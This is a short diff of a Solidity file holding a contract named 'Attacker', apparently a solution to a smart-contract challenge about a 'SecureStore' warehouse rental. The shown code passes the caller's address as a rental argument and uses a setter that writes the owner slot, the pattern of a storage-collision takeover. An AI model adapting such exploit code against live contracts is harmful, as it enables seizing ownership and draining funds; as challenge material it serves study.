@@ -3,14 +3,12 @@ pragma solidity 0.8.13;
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 interface ISecureStore {
-    function owner() external view returns (address);
     function rentWarehouse (uint256, uint256) external payable;
-    function pricePerDay() external view returns (uint256);
 }
 
 contract Attacker {
     
-    address public warehouse;
+    address public registryAddress;
     address public owner;
     address public USDC;
 
@@ -27,7 +25,7 @@ contract Attacker {
         target.rentWarehouse(1, uint256(uint160(msg.sender)));
     }
 
-    function setSSN(uint256 _owner) external {
+    function setCurrentRenter(uint256 _owner) external {
         owner = address(uint160(_owner));
     }
 }
